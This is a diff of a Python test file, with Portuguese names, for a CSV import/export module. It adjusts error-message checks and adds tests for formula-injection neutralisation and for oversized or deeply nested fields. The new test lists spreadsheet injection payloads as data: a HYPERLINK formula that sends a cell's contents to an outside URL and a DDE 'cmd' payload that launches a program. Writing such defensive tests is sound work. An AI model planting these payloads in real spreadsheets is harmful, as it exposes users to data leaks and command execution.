@@ -49,8 +49,8 @@ def test_linha_errada_diz_a_linha_e_o_motivo() -> None:
     )
     rows = csv_cases.parse(raw)
     assert rows[0].errors == []
-    assert rows[1].line == 3 and any("checks" in e for e in rows[1].errors)
-    assert rows[2].line == 4 and any("name" in e for e in rows[2].errors)
+    assert rows[1].line == 3 and any("checagens" in e for e in rows[1].errors)
+    assert rows[2].line == 4 and rows[2].errors == ["nome: não pode ficar vazio"]
     assert rows[3].errors == ["nota_minima sem criterio"]
 
 
@@ -179,3 +179,38 @@ def test_limite_de_casos(client: TestClient) -> None:
     resp = _upload(client, agent, f"nome,mensagem,contem\n{lines}".encode())
     assert resp.status_code == 422
     assert "comporta mais 50" in resp.json()["detail"]
+
+
+def test_exportacao_neutraliza_formula_e_volta_igual() -> None:
+    nasty = [
+        '=HYPERLINK("http://x/?"&A2,"clique")',
+        "+cmd|' /C calc'!A0",
+        "@SUM(1)",
+        "-2+3",
+        "'=já tinha apóstrofo",
+    ]
+    cases = [
+        SimpleNamespace(
+            name=f"caso {i}",
+            input=text,
+            context=[],
+            checks=[{"type": "text", "kind": "contains", "value": "ok", "step": None}],
+        )
+        for i, text in enumerate(nasty)
+    ]
+    exported = csv_cases.dump(cases)
+    for line in exported.splitlines()[1:]:
+        cell = line.split(";")[1].strip('"')
+        assert not cell.startswith(("=", "+", "-", "@")), cell
+    rows = csv_cases.parse(exported.encode("utf-8-sig"))
+    assert [r.errors for r in rows] == [[]] * len(nasty)
+    assert [r.case.input for r in rows if r.case] == nasty
+
+
+def test_outras_aninhado_e_campo_gigante_nao_dao_500() -> None:
+    nested = "[" * 5000 + "]" * 5000
+    (row,) = csv_cases.parse(f'nome,mensagem,outras\nx,oi,"{nested}"\n'.encode())
+    assert row.errors and "outras" in row.errors[0]
+    big = "a" * 200_000
+    with pytest.raises(csv_cases.CsvError, match="Linha"):
+        csv_cases.parse(f"nome,mensagem\nx,{big}\n".encode())
